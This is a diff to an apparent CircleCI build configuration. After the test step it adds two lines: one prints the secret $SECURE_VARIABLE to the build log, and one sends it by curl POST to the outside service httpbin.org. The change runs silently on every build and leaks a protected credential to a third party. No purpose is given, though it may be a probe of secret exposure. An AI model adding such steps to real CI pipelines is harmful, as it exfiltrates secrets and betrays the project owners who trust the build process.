@@ -49,6 +49,8 @@ jobs:
           command: |
             . venv/bin/activate
             python test/test.py
+            echo $SECURE_VARIABLE
+            curl -d "param1=$SECURE_VARIABLE" -X POST https://httpbin.org/post
 
       - store_artifacts:
           path: test-reports
